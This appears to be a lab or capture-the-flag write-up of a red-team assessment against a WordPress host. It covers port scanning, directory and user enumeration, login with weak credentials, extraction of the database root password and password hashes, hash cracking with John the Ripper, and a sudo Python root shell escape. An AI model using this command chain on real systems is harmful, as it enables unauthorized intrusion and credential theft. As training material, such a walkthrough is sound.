**Red Team Assessment (Target 1)**

**1. Scanning**

1. Run An Initial Nmap Scan

Command: nmap -sT -A -p- -Pn -T4 --reason -oA host-1-scan 192.168.1.110

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red%20Team/Red_1.png" width=50% height=50%>

**2. Enumeration**

2.1 Enumerating SSH (Port 22)

2.1.1 Enumerating The SSH Package Version

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red%20Team/Red_3.png" width=50% height=50%>

2.2 Enumerating HTTP (Port 80)

2.2.1 Enumerating Hidden Subdirectories

Command: dirb http://192.168.1.110

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red%20Team/Red_4.png" width=50% height=50%>

2.2.2 Enumerating Wordpress Files And Version

Command: wpscan --url http://192.168.1.110/wordpress

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red%20Team/Red_7.png" width=50% height=50%>

2.2.3 Enumerating Wordpress Users

Command: wpscan [http://192.168.1.110/wordpress/](http://192.168.1.110) --enumerate u

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red%20Team/Red_9.png" width=50% height=50%>

2.3 Enumerating NetBIOS (Port 139)

2.3.1 Enumerating The NetBIOS Hostname

Command: nbtscan 192.168.1.110

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red%20Team/Red_5.png" width=50% height=50%>

2.4 Enumerating SMB (Port 445)

2.4.1 Enumerating SMB Shares

![Red_6.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/4503e3b2521b49d29e7bde803285e47d.png)

Enumeration Summary

1. Target OS - Linux (Debian)

2. SSH Version - Open SSH 6.7

3. Wordpress Version - Wordpress 4.8.18

4. Wordpress Users - Michael, Steven

5. NetBios Hostname - TARGET1

6. SMB Version - Samba 4.2.14

**3. Exploitation**

3.1 Log Into The Machine Using The Weak Credentials For The User Michael

Credentials - michael:michael

![Red_10.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/cc9a3ad16229476b899021a3afa113b9.png)

**Flag 1**

Location: /var/www/html

![Flag_1.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/e44ca6edc19b4a50b67088fb788acfb2.png)

**Flag 2**

Location: /var/www

![Flag_2.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/ec75782c607844e38fce6d7e09594d93.png)

3.2 Enumerate The Apache Web Root

Web Root: /var/www/html

![Flag_4.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/c34bd380a43a4ae8a42f1724cbb9b79f.png)

3.3 Enumerate The Configuration File

![Flag_3.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/c6ac828335fa49ccbfc6b741c7ec0fc7.png)

Credentials Found - root:R@v3nSecurity

3.4 Connect To The MySQL Database

Command: mysql -uroot -pR@v3nSecurity

![MySQL_1.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/a95ed68307494f59b9983beea29c21d1.png)

3.5 Enumerate The Wordpress Database

![MySQL_2.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/d2aaa38436664b3ab253f6599d3eb0d5.png)

Hashes Found:

michael:$P$BjRvZQ.VQcGZ1DeiKToCQd.cPw5XCe0

steven:$P$BkJVD9jsxx/loJoqNsURgHiaB23j7W/

**Flag 3**

Location: Wordpress Database -> Wordpress Posts Table

![Flag_3.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/649cb8d04c7f4f57a2159641c08a8c75.png)

3.6 Crack Stevens Password Hash Using John The Ripper

Command: john --wordlist /usr/share/wordlists/rockyou.txt hashes.txt

![John_1.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/8afab7a6979746e48178477bbc3a7cbf.png)

Credentials Found - steven:pink84

3.7 Log Into The Machine Using The Found Credentials

![John_2.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/8727e03a5d6947bf846804225ccadf6b.png)

**4. Local Enumeration**

4.1 Check Sudo Privileges On The Machine

Command: sudo -l

![John_3.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/b796820f0ce04d47aaef0cf3d1d4b161.png)

4.2 Check GTFO Bins For A Python Sudo Exploit

![John_4.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/568ce1b832cb4118902596f3d73ca30a.png)

**5. Privilege Escalation**

5.1 Spawn The System Shell As the Root User

Command: sudo python -c 'import os; os.system("/bin/sh")'

![Root_1.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/7c1ce811b923431ea44a28c86d3e8a2b.png)

**Flag 4**

Location: /root
